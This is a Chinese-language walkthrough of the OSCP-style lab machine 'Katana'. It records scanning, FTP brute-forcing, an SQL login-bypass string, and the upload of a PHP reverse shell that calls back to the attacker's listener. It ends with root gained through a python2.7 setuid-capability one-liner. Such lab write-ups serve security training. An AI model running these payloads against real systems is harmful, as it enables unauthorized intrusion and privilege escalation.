# OSCP系列靶场-Esay-Katana

## 总结

getwebshell → 目录扫描发现上传点 → 上传后通过细微区别找到上传路径 → 上传反弹`shell`→ `getwebshell`

提 权 思 路 → `Capabilities`搜索 → `python-Capabilities`提权

## 准备工作

  * 启动VPN  
获取攻击机IP → `192.168.45.216`

![](https://image.3001.net/images/20230810/1691640461_64d4628dba552caee0a3f.png!small)

  * 启动靶机  
获取目标机器IP → `192.168.205.83`

![](https://image.3001.net/images/20230810/1691640463_64d4628f45295a92bd4e7.png!small)

## 信息收集-端口扫描

### 目标开放端口收集

  * Nmap开放端口扫描2次

    
    
    sudo nmap --min-rate 10000 -p- 192.168.205.83
    
    PORT     STATE SERVICE
    21/tcp   open  ftp
    22/tcp   open  ssh
    80/tcp   open  http
    7080/tcp open  empowerid
    8088/tcp open  radan-http
    8715/tcp open  unknown
    

![](https://image.3001.net/images/20230810/1691640464_64d462902d8933ec54b1d.png!small)  
`开放的端口-→21,22,80,7080,8088,8715`有点多≧ ﹏ ≦

### 目标端口对应服务探测

    
    
    # tcp探测
    sudo nmap -sT -sV -O -sC -p21,22,80,7080,8088,8715 192.168.205.83
    
    PORT     STATE SERVICE       VERSION
    21/tcp   open  ftp           vsftpd 3.0.3
    22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    80/tcp   open  http          Apache httpd 2.4.38 ((Debian))
    7080/tcp open  ssl/empowerid LiteSpeed
    8088/tcp open  http          LiteSpeed httpd
    8715/tcp open  http          nginx 1.14.2
    

![](https://image.3001.net/images/20230810/1691640465_64d462918cba442a2267d.png!small)

## 信息收集-端口测试

### 21-FTP端口的信息收集

#### 21-FTP版本版本信息

通过`Nmap`探测获得FTP的版本信息，可以大致推测FTP的配置文件位置  
探测版本为`vsftpd 3.0.3`

    
    
    # 通常配置文件所在位置
    /etc/vsftpd.conf
    

#### 21-FTP端口匿名登录测试(失败)

尝试匿名账号`anonymous`以及无密码进行登录测试

    
    
    # 利用ftp协议+ip进行连接测试
    ftp 192.168.205.83
    Name: anonymous
    

该服务没有开启匿名`免密`登录的功能

![](https://image.3001.net/images/20230810/1691640467_64d4629353f800d307eee.png!small)

#### 暴力破解-ftp常见用户密码破解尝试

在利用ftp匿名登录的时候可能会出现无法登录的情况，这时候就需要尝试暴力破解  
在这里指定常见的默认用户`root``admin``anonymous`

    
    
    echo "root
    admin
    anonymous" → 1.txt
    
    
    
    # -L 指定账号字典 -P指定密码字典
    hydra -L 1.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 -vV 192.168.205.83 ftp -s 21
    

尝试进行`ftp`的爆破实践

![](https://image.3001.net/images/20230810/1691640468_64d4629457fe65392c58b.png!small)  
爆破了一段时间，爆破无果

![](https://image.3001.net/images/20230810/1691640469_64d46295a17dd394d58c1.png!small)

### 22-SSH端口的信息收集

#### 22-SSH端口版本信息与MSF利用

通过`Nmap`探测获得SSH的版本信息，可以尝试利用  
探测版本为`OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)`

    
    
    # 搜索对应脚本，发现没有
    msf6 → searchsploit openssh 7.9
    

![](https://image.3001.net/images/20230810/1691640471_64d4629734299a912a5df.png!small)  
发现搜索到可利用的和用户枚举有关（待定）

#### 22-SSH协议支持的登录方式

通过`Nmap`探测获得SSH的版本信息，在获取到某个用户名之后尝试

    
    
    sudo ssh root @192.168.205.83 -v
    

显示`publickey`、`password`就是支持密钥以及密码登录  
显示`keyboard-interactive`就是支持交互式回答密码登录

![](https://image.3001.net/images/20230810/1691640472_64d462981512610c13e58.png!small)

#### 22-SSH手动登录尝试(无)

因为支持密码登录，尝试`root`账户的密码弱密码尝试

    
    
    ssh root @192.168.205.83 -p 22
    # 密码尝试
    password → root
    

提示权限被拒绝

![](https://image.3001.net/images/20230810/1691640473_64d46299709b58d247593.png!small)  
弱密码尝试失败

### 80-HTTP端口的信息收集

访问 `http://192.168.205.83:80`不是`CMS`我们直接从`HTML`隐藏信息收集开始  
里面是一张图片，极具个人特点，可能存在图片隐写术(待定)

![](https://image.3001.net/images/20230810/1691640474_64d4629a37f43189b1d09.png!small)

#### 信息收集-HTML隐藏信息查看

    
    
    # 包括文章中是否写明一些敏感信息
    curl http://192.168.205.83:80
    

没什么隐藏信息，可能`Katana`是用户名

![](https://image.3001.net/images/20230810/1691640475_64d4629b03bad2086e0cf.png!small)

#### 信息收集-目录扫描

##### 信息收集-目录扫描初步

    
    
    dirsearch -u http://192.168.205.83:80 -x 302,403
    

![](https://image.3001.net/images/20230810/1691640476_64d4629c600c0f7af8d6b.png!small)  
没有任何发现，决定上大字典扫描器

    
    
    # -t 指定线程 -x 添加后缀扩展名 -k 禁用ssl
    gobuster dir -u http://192.168.205.83:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100  -k
    

通过大字典发现了`/Ebook/`端点

![](https://image.3001.net/images/20230810/1691640477_64d4629d4233074390766.png!small)

### 7080端口的信息收集

端口信息是`7080/tcp open empowerid`  
通过查阅得到以下信息

    
    
    端口7080是用于EmpowerID身份和访问管理解决方案的TCP端口。EmpowerID是一种身份和访问管理平台，用于管理用户身份、权限和访问控制。
    

访问`http://192.168.205.83:7080`提示需要证书无法访问

![](https://image.3001.net/images/20230810/1691640478_64d4629e56e5119ce3596.png!small)

### 8088端口的信息收集

端口信息是`8088/tcp open radan-http`  
通过查阅得到以下信息

    
    
    端口8088是用于Radan HTTP的TCP端口。Radan是一种CAD/CAM软件，用于扁平和三维金属加工和制造。
    

访问`http://192.168.205.83:8088`与80端口类似

![](https://image.3001.net/images/20230810/1691640479_64d4629f92b60cd247d32.png!small)

### 8715端口的信息收集

`8715 http nginx 1.14.2`  
访问发现像一个代理服务器存在登录窗口  
尝试了一下脆弱口令`admin``admin`进去了，存在弱口令，从名称上看是`nginx`的转发端口

![](https://image.3001.net/images/20230810/1691640481_64d462a13b34ad7a5ac38.png!small)

### 7080、8080、8715端口的目录扫描

三个端口没什么思路的情况都扫扫

#### 信息收集-dirsearch基础目录扫描

    
    
    dirsearch -u http://192.168.205.83:8715 -x 302,403
    dirsearch -u http://192.168.205.83:8088 -x 302,403
    dirsearch -u http://192.168.205.83:7080 -x 302,403
    

![](https://image.3001.net/images/20230810/1691640482_64d462a2aa9ff5468e710.png!small)  
扫描完毕之后发现8088端口可以研究的内容较多

![](https://image.3001.net/images/20230810/1691640484_64d462a49894558a9912f.png!small)

## 漏洞利用-getwebshell

### /Ebook/端点文件上传(失败的经历)

从总体来看首先去收集端点信息  
访问 `http://192.168.205.83/ebook/index.php`发现是一个`CMS`

![](https://image.3001.net/images/20230810/1691640486_64d462a66722b72375350.png!small)  
存在一个登录界面

![](https://image.3001.net/images/20230810/1691640487_64d462a7d13306cb17357.png!small)  
登录界面的利用方式比较多可以挨个试试

#### 端点信息收集

    
    
    ┌──(root㉿Kali)-[/home/bachang/Katana]
    └─# whatweb http://192.168.205.83/ebook/index.php
    http://192.168.205.83/ebook/index.php [200 OK] Apache[2.4.38], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.205.83], JQuery[2.1.4], Script[text/javascript], Title[Index], X-UA-Compatible[IE=edge]
    

该端点的`CMS`是`CSE Bookstore`

#### 万能密码登录绕过

之前遇到过同类型的站点，使用msf进行搜索

    
    
    searchsploit CSE Bookstore
    

![](https://image.3001.net/images/20230810/1691640488_64d462a8a90b630dcfabb.png!small)  
查看一下如何登录绕过

    
    
    cat /usr/share/exploitdb/exploits/php/webapps/48960.txt
    

可以得到的信息是默认用户`admin`密码利用`sql`万能密码绕`%' or '1'='1`

![](https://image.3001.net/images/20230810/1691640489_64d462a9c33f1464455d4.png!small)  
成功登录了系统

![](https://image.3001.net/images/20230810/1691640491_64d462ab6de8bb5584eb3.png!small)

#### 文件上传getwebshell(失败)

同类型的站点我们遇到过，尝试文件上传

    
    
    # 根据脚本语言制作一个测试的php
    ┌──(root㉿Kali)-[/home/bachang/Katana]
    └─# echo "echo '1111'" → 1.php
    

收集`Apress`添加新的`book`

![](https://image.3001.net/images/20230810/1691640492_64d462acb5573f86a0230.png!small)  
构造好上传之后

![](https://image.3001.net/images/20230810/1691640494_64d462ae06f848c29eedd.png!small)  
尝试访问`ebook`主页上的上传地址

![](https://image.3001.net/images/20230810/1691640495_64d462af7d158402f9fcd.png!small)

    
    
    http://192.168.205.83/ebook/bootstrap/img/1.php
    

直接失败，原地罚站

![](https://image.3001.net/images/20230810/1691640496_64d462b0df816495c0740.png!small)

### 8088端口文件上传

#### /upload.html端点探索

访问 `http://192.168.205.83:8088/upload.html`  
发现了一个文件上传点

![](https://image.3001.net/images/20230810/1691640497_64d462b1ac3ef9b8d9f41.png!small)  
上传1个`1.php`的脚本，提示上传成功，但是在缓存目录

![](https://image.3001.net/images/20230810/1691640498_64d462b2d4b26ad3ae3de.png!small)

#### 上传点探索

探索尝试，8088端口没有捏

![](https://image.3001.net/images/20230810/1691640500_64d462b4045eeb19e128f.png!small)  
仔细研究发现了突破口`Moved to other web server`

![](https://image.3001.net/images/20230810/1691640501_64d462b50d731f590b370.png!small)  
提示说上传到其他`web`服务下命名为`katana_1.php`

    
    
    Please wait for 1 minute!. Please relax!.
    
    File : file1
    Name : 1.txt
    Type : text/plain
    Path : /tmp/phpCp60j6
    Size : 21
    Please wait for 1 minute!. Please relax!.
    
    Moved to other web server: /tmp/phpCp60j6 ====→ /opt/manager/html/katana_1.txt
    MD5 : d55ef8642f4906ca13bcd6ed4f080aca
    Size : 21 bytes
    
    File : file2
    Name : 1.php
    Type : application/x-php
    Path : /tmp/php4egTpo
    Size : 12
    Please wait for 1 minute!. Please relax!.
    
    Moved to other web server: /tmp/php4egTpo ====→ /opt/manager/html/katana_1.php
    MD5 : 86497caacf187bcf6a6c552f09ab23c0
    

尝试去其他端口访问，最终在8715端口发现 ( •̀ ω •́ )y

![](https://image.3001.net/images/20230810/1691640502_64d462b62e7d1eb4cdf91.png!small)

### 构造反弹shell-getwebshell

    
    
    # 利用cp命令cp一个到当前文件夹并且命名为shell.php
    sudo cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
    
    
    
    # 开启监听
    sudo nc -lvnp 5555
    

反弹shell配置

    
    
    # 利用grep确定修改反弹shell_ip的第49行
    grep -n "127.0.0.1" shell.php                
    → 49:$ip = '127.0.0.1';  // CHANGE THIS
    # 同理监听端口是第50行
    grep -n "1234" shell.php
    50:$port = 1234;       // CHANGE THIS
    # 利用sed命令替换里面的内容
    sed -i '49s/127.0.0.1/192.168.45.216/' shell.php
    sed -i '50s/1234/5555/' shell.php
    # 利用sed查看49与50行是否修改成功
    sed -n '49,50p' shell.php
    

![](https://image.3001.net/images/20230810/1691640503_64d462b7193ff4986ef6a.png!small)  
上传得到`katana_shell.php`

![](https://image.3001.net/images/20230810/1691640504_64d462b811776ac7fbcea.png!small)

    
    
    # curl成功反弹
    curl http://192.168.205.83:8715/katana_shell.php
    

![](https://image.3001.net/images/20230810/1691640505_64d462b96e8abd104cb94.png!small)

## 内网遨游-getshell

### 交互shell

由于获取的shell交互不友好，利用python获得新的交互shell

    
    
    python -c "import pty;pty.spawn('/bin/bash')";
    

![](https://image.3001.net/images/20230810/1691640506_64d462ba7d44effa67991.png!small)

### FLAG1获取

    
    
    www-data @katana:/$ find / -name local.txt 2→/dev/null
    /var/www/local.txt
    www-data @katana:/$ cat /var/www/local.txt
    36eab81cb9a6f3e953a91a079864ddd1
    

![](https://image.3001.net/images/20230810/1691640507_64d462bb9a89c893834be.png!small)

### 信息收集-内网基础信息收集

提权的本质在于`枚举`，在获取shell之后我们要进行内网信息的收集，都是为了`提权`做准备

#### 检测Linux操作系统的发行版本

较老的`Ubuntu`以及Linux系统可以`overlayfs`提权

    
    
    # 确定发行版本
    www-data @katana:/$ lsb_release -a
    No LSB modules are available.
    Distributor ID: Debian
    Description:    Debian GNU/Linux 10 (buster)
    Release:        10
    Codename:       buster
    

发行版本为`Debian`，不太能`overlayfs`提权

![](https://image.3001.net/images/20230810/1691640508_64d462bcb6c610902c1c9.png!small)

#### 检测Linux操作系统的内核版本

较低的内核版本可以进行`脏牛`提权

    
    
    www-data @katana:/$ uname -a 
    Linux katana 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
    

内核版本为`4.19.0`

![](https://image.3001.net/images/20230810/1691640509_64d462bd74c2445936c98.png!small)

#### 检测当前用户的权限

    
    
    www-data @katana:/$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

![](https://image.3001.net/images/20230810/1691640510_64d462be2de09a9a8f125.png!small)

#### 列举出所有的sudo文件

查找具有`sudo`权限，且不需要密码的可提权文件  
如果发现`sudo -l`有东西的话 访问 `https://gtfobins.github.io`寻找

    
    
    # 利用sudo -l寻找
    sudo -l
    

发现需要密码

![](https://image.3001.net/images/20230810/1691640511_64d462bf1b200bd8f1e1b.png!small)

#### 列举出所有suid文件

如果发现`u=s`有东西的话 访问 `https://gtfobins.github.io`寻找

    
    
    # -perm 文件权限
    www-data @katana:/$ find / -perm -u=s -type f 2→/dev/null
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/openssh/ssh-keysign
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/bin/gpasswd
    /usr/bin/sudo
    /usr/bin/umount
    /usr/bin/mount
    /usr/bin/su
    /usr/bin/newgrp
    /usr/bin/chfn
    /usr/bin/passwd
    /usr/bin/chsh
    /usr/bin/fusermount
    

![](https://image.3001.net/images/20230810/1691640511_64d462bff2ac805c850fa.png!small)

#### /etc/passwd权限收集

如果`/etc/passwd`具有写入权限可以尝试覆盖密码提权

    
    
    www-data @katana:/$ ls -al /etc/passwd
    ls -al /etc/passwd
    -rw-r--r-- 1 root root 1726 Jul  3  2020 /etc/passwd
    

#### /etc/shadow权限收集

  * 如果`/etc/shadow`具有写入权限可以尝试覆盖密码提权

  * 如果`/etc/shadow`具有可读权限可以爆破密码

    
    
    www-data @katana:/$ ls -al /etc/shadow
    ls -al /etc/shadow
    -rw-r----- 1 root shadow 1013 May 11  2020 /etc/shadow
    

#### getcap标志进程收集

高版本下`suid`列举不全，查看`getcap`

    
    
    # 探查有CAP_SETUID标志的进程
    www-data @katana:/$ /usr/sbin/getcap -r / 2→/dev/null
    /usr/bin/ping = cap_net_raw+ep
    /usr/bin/python2.7 = cap_setuid+ep
    

发现了`python`依旧会心一笑

![](https://image.3001.net/images/20230810/1691640512_64d462c0cd8a59422417c.png!small)

### 权限提升

#### Capabilities-python提权

如果发现有东西的话 访问 https://gtfobins.github.io 寻找

![](https://image.3001.net/images/20230810/1691640513_64d462c1d47ba04f6bc00.png!small)  
得到提权命令

    
    
    www-data @katana:/$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
    # id
    uid=0(root) gid=33(www-data) groups=33(www-data)
    

提权成功

![](https://image.3001.net/images/20230810/1691640514_64d462c2a10454dd0a235.png!small)

### FLAG2获取

    
    
    # cat /root/proof.txt
    377f9b72e895cca72a3459be32667b89
    

完结撒花~

![](https://image.3001.net/images/20230810/1691640515_64d462c35f8952b6c6243.png!small)

## 思考

开始看到见过的`CMS`激动了一下，结果上传点无效有点懵

在寻找后面的上传点时需要细致一些，多注意关键内容

